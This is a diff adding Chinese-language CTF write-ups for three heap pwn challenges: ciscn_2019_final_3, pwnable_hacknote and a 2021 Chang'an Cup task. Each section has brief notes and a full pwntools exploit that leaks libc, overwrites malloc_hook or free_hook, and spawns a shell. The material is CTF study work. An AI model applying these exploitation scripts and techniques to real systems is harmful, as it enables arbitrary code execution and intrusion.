@@ -930,3 +930,255 @@ p.send(p64(bin_addr))
 p.interactive()
 ```
 
+## ciscn_2019_final_3
+
+tcache dup可以造成overlap
+
+gift泄露libc
+
+修改malloc_hook或free_hook均可
+
+怪事，libc版本都是2.27-3ubuntu1，但远程打得通本地打不通
+
+```python
+from pwn_debug import *
+context.log_level = 'debug'
+
+pdbg = pwn_debug('./ciscn_final_3')
+
+pdbg.local("/home/xyc/libc/libs/2.27-3ubuntu1_amd64/libc-2.27.so", "/home/xyc/libc/libs/2.27-3ubuntu1_amd64/ld-2.27.so")
+pdbg.remote("node4.buuoj.cn", 29178, "/home/xyc/libc/libs/2.27-3ubuntu1_amd64/libc-2.27.so")
+
+p = pdbg.run('local')
+libc = pdbg.libc
+
+one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
+
+def add(index, size, content):
+	p.recvuntil("choice > ")
+	p.sendline("1")
+	p.recvuntil("input the index\n")
+	p.sendline(str(index))
+	p.recvuntil("input the size\n")
+	p.sendline(str(size))
+	p.recvuntil("now you can write something\n")
+	p.sendline(content)
+	
+def remove(index):
+	p.recvuntil("choice > ")
+	p.sendline("2")
+	p.recvuntil("input the index\n")
+	p.sendline(str(index))
+
+add(0, 0x28, 'aaaa')
+add(1, 0x78, 'aaaa')
+p.recvuntil("gift :")
+heap1_addr = p.recvuntil("\n", drop=True)
+heap1_addr = int(heap1_addr, 16)
+log.success("heap1_addr:" + str(heap1_addr))
+add(2, 0x18, 'aaaa')
+add(3, 0x78, 'aaaa')
+add(4, 0x78, 'aaaa')
+add(5, 0x78, 'aaaa')
+add(6, 0x78, 'aaaa')
+add(7, 0x78, 'aaaa')
+add(8, 0x78, 'aaaa')
+add(9, 0x78, 'aaaa')
+add(10, 0x78, 'aaaa')
+add(11, 0x78, 'aaaa')
+add(12, 0x78, 'aaaa')
+add(13, 0x28, 'aaaa')
+remove(13)
+remove(13)
+add(14, 0x28, p64(heap1_addr-0x10))
+add(15, 0x28, p64(heap1_addr-0x10))
+add(16, 0x28, p64(0) + p64(0x421))
+
+remove(1)
+remove(2)
+
+add(17, 0x78, 'e')
+add(18, 0x18, 'f')
+add(19, 0x18, 'a')
+p.recvuntil("gift :")
+addr = p.recvuntil("\n", drop=True)
+addr = int(addr, 16)
+main_arena_offset = libc.symbols["__malloc_hook"] + 0x10 + 96
+libc_addr = addr - main_arena_offset
+log.success(hex(libc_addr))
+
+malloc_hook = libc_addr + libc.symbols["__malloc_hook"]
+realloc = libc_addr + libc.symbols['__libc_realloc']
+free_hook = libc_addr + libc.symbols['__free_hook']
+system_addr = libc_addr + libc.symbols['system']
+
+remove(12)
+remove(12)
+add(20, 0x78, p64(malloc_hook))
+add(21, 0x78, p64(malloc_hook))
+add(22, 0x78, p64(libc_addr + one_gadget[2]))
+#add(20, 0x78, p64(free_hook))
+#add(21, 0x78, p64(free_hook))
+#add(22, 0x78, p64(system_addr))
+#add(23, 0x18, b'/bin/sh\x00')
+#remove(23)
+log.success("one_gadget :" + hex(libc_addr + one_gadget[2]))
+log.success("malloc_hook :" + hex(malloc_hook))
+p.sendline("1")
+p.recv()
+p.sendline("23")
+p.recv()
+p.interactive()
+```
+
+## pwnable_hacknote
+
+uaf
+
+```python
+from pwn_debug import *
+context.log_level = 'debug'
+
+p = process(['/home/xyc/libc/libs/2.23-0ubuntu11.3_i386/ld-2.23.so','./hacknote'],env={"LD_PRELOAD":"/home/xyc/libc/libs/2.23-0ubuntu11.3_i386/libc-2.23.so"})
+p = remote("node4.buuoj.cn", 27912)
+libc = ELF("/home/xyc/share/s/libc-2.23_x86.so")
+elf = ELF("./hacknote")
+
+def add(size, content):
+	p.recvuntil("Your choice :")
+	p.sendline("1")
+	p.recvuntil("Note size :")
+	p.sendline(str(size))
+	p.recvuntil("Content :")
+	p.send(content)
+
+def free(index):
+	p.recvuntil("Your choice :")
+	p.sendline("2")
+	p.recvuntil("Index :")
+	p.sendline(str(index))
+
+def show(index):
+	p.recvuntil("Your choice :")
+	p.sendline("3")
+	p.recvuntil("Index :")
+	p.sendline(str(index))
+	
+free_got = elf.got['free']
+add(0x28, 'a')
+add(0x28, 'a')
+free(0)
+free(1)
+add(8, p32(0x804862b) + p32(free_got))
+show(0)
+free_addr = u32(p.recv(4))
+libc_addr = free_addr - libc.symbols['free']
+sys_addr = libc_addr + libc.symbols['system']
+free(2)
+add(8, p32(sys_addr)+";sh\x00")
+show(0)
+p.interactive()
+```
+
+## 2021长安杯高校组baigei
+
+不是buu的题，只是今天做了又没地方放，不值得单独开一篇，顺手放进来了。
+
+add里程序逻辑有漏洞，可以double_add从而修改sizearray中对应的值，从而造成溢出
+
+溢出之后unsorted bin leak泄露libc
+
+tcache poisoning 修改free_hook为system
+
+```python
+from pwn_debug import *
+context.log_level = 'debug'
+
+pdbg = pwn_debug("./mm")
+
+pdbg.local("/home/xyc/libc/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so", "/home/xyc/libc/libs/2.27-3ubuntu1.4_amd64/ld-2.27.so")
+pdbg.remote("113.201.14.253", 21111, "/home/xyc/libc/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so")
+
+p = pdbg.run('remote')
+libc = pdbg.libc
+elf = pdbg.elf
+
+def add(index, size, content):
+	p.recvuntil(">>\n")
+	p.sendline("1")
+	p.recvuntil("idx?\n")
+	p.sendline(str(index))
+	p.recvuntil("size?\n")
+	p.sendline(str(size))
+	p.recvuntil("content?")
+	p.send(content)
+
+def changesize(index, size):
+	p.recvuntil(">>\n")
+	p.sendline("1")
+	p.recvuntil("idx?\n")
+	p.sendline(str(index))
+	p.recvuntil("size?\n")
+	p.sendline(str(size))
+	
+def delete(index):
+	p.recvuntil(">>\n")
+	p.sendline("2")
+	p.recvuntil("idx?\n")
+	p.sendline(str(index))
+
+def edit(index, size, content):
+	p.recvuntil(">>\n")
+	p.sendline("3")
+	p.recvuntil("idx?\n")
+	p.sendline(str(index))
+	p.recvuntil("size?\n")
+	p.sendline(str(size))
+	p.recvuntil("content?")
+	p.send(content)
+	
+def show(index):
+	p.recvuntil(">>\n")
+	p.sendline("4")
+	p.recvuntil("idx?\n")
+	p.send(str(index))
+
+one_gadget = [0x4f3d5, 0x4f432, 0x10a41c]
+
+add(0, 0x28, 'a'*0x28) #0
+changesize(0, 0x410)
+add(1, 0x200, 'b') #1
+add(2, 0x200, 'b')
+add(3, 0x28, 'b')
+edit(0, 0x30, 'a'*0x28 + p64(0x421))
+delete(1)
+edit(0, 0x30, 'a'*0x30)
+show(0)
+p.recv(4+0x30)
+addr = u64(p.recv(6).ljust(8, '\x00'))
+main_arena_offset = libc.symbols["__malloc_hook"] + 0x10 + 96
+libc_addr = addr - main_arena_offset
+log.success(hex(libc_addr))
+edit(0, 0x30, 'a'*0x28 + p64(0x421))
+malloc_hook = libc_addr + libc.symbols['__malloc_hook']
+realloc = libc_addr + libc.symbols['__libc_realloc']
+free_hook = libc_addr + libc.symbols['__free_hook']
+system = libc_addr + libc.symbols['system']
+
+add(4, 0x28, 'b')
+delete(4)
+#edit(0, 0x38 , 'a'*(0x28) + p64(0x31) + p64(malloc_hook-8))
+#add(5, 0x28, 'b')
+#add(6, 0x28, p64(libc_addr + one_gadget[1]) + p64(realloc+20))
+#p.recv()
+#p.sendline("1")
+#p.sendline("7")
+#p.sendline("20")
+#p.recv()
+edit(0, 0x38 , 'a'*(0x28) + p64(0x31) + p64(free_hook))
+add(5, 0x28, '/bin/sh\x00')
+add(6, 0x28, p64(system))
+delete(5)
+p.interactive()
+```
+
